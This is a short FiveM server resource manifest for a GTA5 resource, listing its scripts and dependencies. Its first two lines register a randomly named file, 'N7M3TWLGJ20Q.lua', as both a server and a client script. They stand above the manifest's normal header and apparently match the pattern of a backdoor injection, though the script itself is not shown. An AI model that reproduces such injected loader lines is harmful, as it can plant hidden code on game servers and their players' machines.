server_script "N7M3TWLGJ20Q.lua"
client_script "N7M3TWLGJ20Q.lua"
fx_version("cerulean")
games({ "gta5" })
lua54("yes")
client_script("@sandbox-base/components/cl_error.lua")
client_script("@sandbox-pwnzor/client/check.lua")

client_scripts({
	"config/**/*.lua",
	"client/**/*.lua",
})
